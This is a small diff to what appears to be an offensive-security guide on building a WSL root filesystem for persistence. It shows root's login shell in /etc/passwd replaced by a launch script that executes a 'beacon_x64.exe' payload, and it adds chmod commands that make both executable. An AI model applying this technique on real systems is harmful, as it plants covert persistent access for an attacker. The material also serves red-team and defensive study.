@@ -60,7 +60,13 @@ root:x:0:0:root:/root:/root/launch.sh  # <- Path to Script
 exec /root/beacon_x64.exe
 ```
 
-This script executes the beacon payload.
+This script executes the beacon payload. Once the script and payload are set we should give them execution properties
+
+```sh
+chmod +x launch.sh
+
+chmod +x beacon_x64.exe
+```
 
 ## Compiling the WSL Root Filesystem
 
